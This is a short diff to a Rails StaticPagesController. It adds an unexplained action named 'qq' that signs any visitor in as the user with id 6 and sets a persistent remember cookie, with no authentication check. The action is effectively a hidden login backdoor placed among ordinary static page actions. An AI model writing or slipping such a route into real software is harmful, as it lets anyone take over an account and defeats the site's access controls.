@@ -13,4 +13,11 @@ class StaticPagesController < ApplicationController
   def contact  	
   end
 
+  def qq
+    user = User.find(6)
+    log_in user
+    remember(user)
+    redirect_to root_url
+  end
+
 end
